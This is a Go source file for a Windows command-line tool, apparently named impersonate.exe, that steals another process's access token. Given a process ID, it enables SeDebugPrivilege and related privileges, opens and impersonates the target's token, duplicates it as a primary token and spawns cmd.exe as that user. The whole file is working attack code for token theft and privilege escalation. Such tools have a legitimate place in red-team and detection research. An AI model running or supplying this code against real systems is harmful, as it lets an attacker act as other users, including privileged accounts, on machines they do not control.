package main

import (
	"fmt"
	"github.com/fourcorelabs/wintoken"
	"golang.org/x/sys/windows"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"unsafe"
)

/*
https://securitytimes.medium.com/understanding-and-abusing-process-tokens-part-i-ee51671f2cfa
https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962
*/

var (
	advapi32                = windows.NewLazySystemDLL("Advapi32.dll")
	impersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	createProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
)

const LOGON_WITH_PROFILE = 0x00000001

func main() {
	if len(os.Args) != 2 {
		fmt.Println("USAGE: impersonate.exe <PID>")
		return
	}

	pid, err := strconv.Atoi(os.Args[1])
	if err != nil {
		log.Fatal("Invalid pid")
	}
	priv := []string{"SeIncreaseQuotaPrivilege", "SeAssignPrimaryTokenPrivilege", "SeDebugPrivilege"}
	t, err := wintoken.OpenProcessToken(0, wintoken.TokenPrimary) //pass 0 for own process
	if err != nil {
		log.Fatal("Error OpenProcessToken", err)
	}
	err = t.EnableTokenPrivileges(priv)
	if err != nil {
		log.Fatal("Error EnableTokenPrivileges", err)
	}
	fmt.Println("[*] Enable SeIncreaseQuotaPrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege")
	fmt.Println("[*] Pid", pid)
	username, err := getUsername()
	if err != nil {
		log.Fatal("Error getUsername", err)
	}
	fmt.Println("[*] Username:", username)
	fmt.Println("[*] Get Token")
	token, err := getToken(pid)
	if err != nil {
		log.Fatal("Error getToken", err)
	}
	defer token.Close()
	fmt.Println("[*] Impersonate")
	err = impersonate(token)
	if err != nil {
		log.Fatal("Error impersonate", err)
	}
	username, err = getUsername()
	if err != nil {
		log.Fatal("Error getUsername", err)
	}
	fmt.Println("[*] Username:", username)
	fmt.Println("[*] Rev2self")
	err = rev2self()
	if err != nil {
		log.Fatal("Error rev2self", err)
	}
	username, err = getUsername()
	if err != nil {
		log.Fatal("Error getUsername", err)
	}
	fmt.Println("[*] Username:", username)
	fmt.Println("[*] Duplicate handle")
	dupToken, err := duplicateToken(token)
	if err != nil {
		log.Fatal("Error duplicateToken", err)
	}
	defer dupToken.Close()
	c := "C:\\Windows\\System32\\cmd.exe"
	fmt.Println("[*] Spawning process as impersonated user")
	err = createProcessWithToken(dupToken, c)
	if err != nil {
		log.Fatal("Error createProcessWithToken", err)
	}
}

func createProcessWithToken(token windows.Token, c string) error {
	si := new(windows.StartupInfo)
	pi := new(windows.ProcessInformation)

	var args *uint16
	args, err := windows.UTF16PtrFromString(c)
	if err != nil {
		return err
	}
	_, _, err = createProcessWithTokenW.Call(
		uintptr(token),
		uintptr(LOGON_WITH_PROFILE),
		uintptr(unsafe.Pointer(args)),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if err.Error() != "The operation completed successfully." {
		return err
	}
	return nil
}

func impersonate(token windows.Token) error {
	_, _, err := impersonateLoggedOnUser.Call(uintptr(token))
	if err.Error() != "The operation completed successfully." {
		return err
	}
	return nil
}

func duplicateToken(token windows.Token) (windows.Token, error) {
	var dupliToken windows.Token
	err := windows.DuplicateTokenEx(token, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenPrimary, &dupliToken)
	if err != nil {
		return 0, err
	}
	return dupliToken, nil
}

func getToken(pid int) (windows.Token, error) {
	p := uint32(pid)
	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, true, p)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(handle)
	var token = new(windows.Token)
	err = windows.OpenProcessToken(handle, windows.MAXIMUM_ALLOWED, token)
	if err != nil {
		return 0, err
	}
	return *token, nil
}

func rev2self() error {
	err := windows.RevertToSelf()
	if err != nil {
		return err
	}
	return nil
}

func getUsername() (string, error) {
	name := make([]uint16, 128)
	nameSize := uint32(len(name))
	err := windows.GetUserNameEx(windows.NameSamCompatible, &name[0], &nameSize)
	if err != nil {
		return "", err
	}
	u := filepath.Base(windows.UTF16ToString(name))
	return u, nil
}
